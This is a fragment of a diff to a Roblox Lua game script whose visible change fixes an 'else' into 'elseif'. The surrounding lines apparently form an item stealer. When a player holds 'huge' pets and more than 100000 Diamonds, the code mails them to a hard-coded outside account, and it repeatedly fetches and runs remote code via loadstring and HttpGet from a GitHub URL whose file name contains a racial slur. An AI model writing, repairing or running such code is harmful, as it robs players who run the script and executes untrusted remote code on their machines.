@@ -320,7 +320,7 @@ while wait() do
 			Invoke("Send Mail", unpack(args))
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)	
-	else v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+	elseif v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
             _G.Username = "W4r_ObScUrE"
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
